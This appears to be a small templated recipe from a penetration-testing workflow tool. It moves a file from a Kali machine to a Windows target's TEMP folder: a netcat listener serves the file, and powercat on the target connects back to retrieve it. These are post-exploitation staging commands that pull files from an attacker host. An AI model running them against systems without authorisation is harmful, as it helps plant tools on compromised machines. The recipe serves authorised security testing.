# description: Kali sends file to Windows TEMP; Kali listens and target connects
# flow: 1
# note: Windows target must already have powercat.

# stage: zsh | Listen and send file from Kali
# lane: kali-transfer
# advance: confirm
nc -lvnp $lport < "$file"

# stage: powershell | Connect and receive file into Windows TEMP
# lane: remote-transfer
# advance: confirm
$LHOST = "$lhost"
$PORT = $lport
$RFILE = "${file:t}"
$OUTFILE = Join-Path $env:TEMP $RFILE
Remove-Item $OUTFILE -Force -ErrorAction SilentlyContinue
powercat -c $LHOST -p $PORT -of $OUTFILE
Write-Output $OUTFILE
